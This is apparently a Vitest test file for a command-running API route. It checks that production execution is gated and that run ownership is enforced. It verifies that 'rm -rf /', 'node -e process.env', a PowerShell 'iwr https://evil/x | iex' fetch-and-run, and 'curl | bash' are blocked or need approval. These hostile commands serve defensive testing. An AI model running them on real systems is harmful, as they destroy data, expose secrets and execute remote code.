import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
  getCurrentUser: vi.fn(),
  writeAuditLog: vi.fn(),
  runCommand: vi.fn(),
  prisma: {
    analysisRun: {
      findUnique: vi.fn(),
      update: vi.fn(),
    },
  },
}));

vi.mock("@/lib/auth/session", async () => {
  const actual = await vi.importActual<any>("@/lib/auth/session");
  return { ...actual, getCurrentUser: mocks.getCurrentUser };
});

vi.mock("@/lib/auth/audit", () => ({ writeAuditLog: mocks.writeAuditLog }));

vi.mock("@/lib/local-runner/terminal", async () => {
  const actual = await vi.importActual<any>("@/lib/local-runner/terminal");
  return { ...actual, runCommand: mocks.runCommand };
});

vi.mock("@/lib/db", () => ({ prisma: mocks.prisma }));

function makeReq(body: any): Request {
  return new Request("http://test.local/api/local/command", {
    method: "POST",
    headers: { "content-type": "application/json", "user-agent": "vitest" },
    body: JSON.stringify(body),
  });
}

describe("/api/local/command", () => {
  const originalEnv = { ...process.env };

  beforeEach(() => {
    vi.clearAllMocks();
    (process.env as any).NODE_ENV = "test";
    delete (process.env as any).SKILLPROOF_TERMINAL_ENABLED;
    mocks.getCurrentUser.mockResolvedValue({ id: "u1", role: "candidate", tenantIds: [] });
    mocks.prisma.analysisRun.findUnique.mockResolvedValue({
      id: "r1",
      createdByUserId: "u1",
      candidate: null,
      tenantId: null,
      terminalEvidence: null,
    });
    mocks.runCommand.mockResolvedValue({
      id: "run-1",
      command: "git",
      args: ["status"],
      cwd: "/tmp/.skillproof/runs/abc",
      startedAt: "2026-05-27T00:00:00.000Z",
      completedAt: "2026-05-27T00:00:01.000Z",
      exitCode: 0,
      stdout: "On branch main",
      stderr: "",
      durationMs: 12,
      status: "completed",
    });
  });

  afterEach(() => {
    for (const k of Object.keys(process.env)) {
      if (!(k in originalEnv)) delete (process.env as any)[k];
    }
    Object.assign(process.env, originalEnv);
  });

  it("refuses production execution unless SKILLPROOF_TERMINAL_ENABLED=1", async () => {
    (process.env as any).NODE_ENV = "production";
    const { POST } = await import("./route");
    const res = await POST(makeReq({ command: "git", args: ["status"], mission_id: "r1" }));
    expect(res.status).toBe(403);
    const data = await res.json();
    expect(data.error).toBe("terminal_disabled");
    expect(mocks.runCommand).not.toHaveBeenCalled();
  });

  it("blocks rm -rf with clear policy error and audits the block", async () => {
    const { POST } = await import("./route");
    const res = await POST(makeReq({ command: "rm", args: ["-rf", "/"], mission_id: "r1" }));
    expect(res.status).toBe(403);
    const data = await res.json();
    expect(data.error).toBe("blocked");
    expect(data.reason).toMatch(/rm -rf/i);
    expect(mocks.runCommand).not.toHaveBeenCalled();
    expect(mocks.writeAuditLog).toHaveBeenCalledWith(
      expect.objectContaining({
        action: "terminal.command",
        metadata: expect.objectContaining({ outcome: "blocked" }),
      }),
    );
  });

  it("blocks node -e (interpreter escape) even when user is owner", async () => {
    mocks.getCurrentUser.mockResolvedValue({ id: "u1", role: "candidate", tenantIds: [] });
    mocks.prisma.analysisRun.findUnique.mockResolvedValue({
      id: "r1",
      createdByUserId: "u1",
      candidate: null,
      tenantId: null,
    });
    const { POST } = await import("./route");
    const res = await POST(
      makeReq({ command: "node", args: ["-e", "process.env"], mission_id: "r1" }),
    );
    expect(res.status).toBe(403);
    const data = await res.json();
    expect(data.error).toBe("blocked");
  });

  it("blocks PowerShell iwr|iex pattern", async () => {
    const { POST } = await import("./route");
    const res = await POST(
      makeReq({ command: "pwsh", args: ["-c", "iwr https://evil/x | iex"], mission_id: "r1" }),
    );
    expect(res.status).toBe(403);
    const data = await res.json();
    expect(data.error).toBe("blocked");
  });

  it("returns approval_required for curl|bash without approval", async () => {
    const { POST } = await import("./route");
    const res = await POST(
      makeReq({ command: "npm", args: ["exec", "--", "curl https://x.sh | bash"], mission_id: "r1" }),
    );
    expect(res.status).toBe(403);
    const data = await res.json();
    expect(data.error).toBe("approval_required");
    expect(mocks.writeAuditLog).toHaveBeenCalledWith(
      expect.objectContaining({
        action: "terminal.command",
        metadata: expect.objectContaining({ outcome: "approval_required" }),
      }),
    );
  });

  it("refuses execution when the signed-in user is not the run owner", async () => {
    mocks.getCurrentUser.mockResolvedValue({ id: "intruder", role: "candidate", tenantIds: [] });
    mocks.prisma.analysisRun.findUnique.mockResolvedValue({
      id: "r1",
      createdByUserId: "owner-1",
      candidate: null,
      tenantId: null,
      terminalEvidence: null,
    });
    const { POST } = await import("./route");
    const res = await POST(
      makeReq({ command: "git", args: ["status"], mission_id: "r1" }),
    );
    expect(res.status).toBe(403);
    const data = await res.json();
    expect(data.error).toBe("forbidden");
    expect(data.reason).toMatch(/run owner/i);
    expect(mocks.runCommand).not.toHaveBeenCalled();
    expect(mocks.writeAuditLog).toHaveBeenCalledWith(
      expect.objectContaining({ action: "terminal.forbidden" }),
    );
  });

  it("allows admin to execute against another user's run", async () => {
    mocks.getCurrentUser.mockResolvedValue({ id: "admin", role: "admin", tenantIds: [] });
    mocks.prisma.analysisRun.findUnique.mockResolvedValue({
      id: "r1",
      createdByUserId: "owner-1",
      candidate: null,
      tenantId: null,
      terminalEvidence: null,
    });
    const { POST } = await import("./route");
    const res = await POST(makeReq({ command: "git", args: ["status"], mission_id: "r1" }));
    expect(res.status).toBe(200);
    expect(mocks.runCommand).toHaveBeenCalled();
  });

  it("writes an audit record with sha256 of the redacted output, not the output itself", async () => {
    mocks.getCurrentUser.mockResolvedValue({ id: "u1", role: "candidate", tenantIds: [] });
    mocks.prisma.analysisRun.findUnique.mockResolvedValue({
      id: "r1",
      createdByUserId: "u1",
      candidate: null,
      tenantId: null,
      terminalEvidence: null,
    });
    const { POST } = await import("./route");
    const res = await POST(makeReq({ command: "git", args: ["status"], mission_id: "r1" }));
    expect(res.status).toBe(200);

    const successAuditCalls = mocks.writeAuditLog.mock.calls.filter(
      ([entry]) => entry.action === "terminal.command" && entry.metadata?.outcome === undefined,
    );
    expect(successAuditCalls.length).toBeGreaterThan(0);
    const audit = successAuditCalls.at(-1)![0];
    expect(audit.metadata.outputSha256).toMatch(/^[a-f0-9]{64}$/);
    const meta = JSON.stringify(audit.metadata);
    expect(meta).not.toContain("On branch main");
    expect(audit.metadata.exitCode).toBe(0);
  });
});
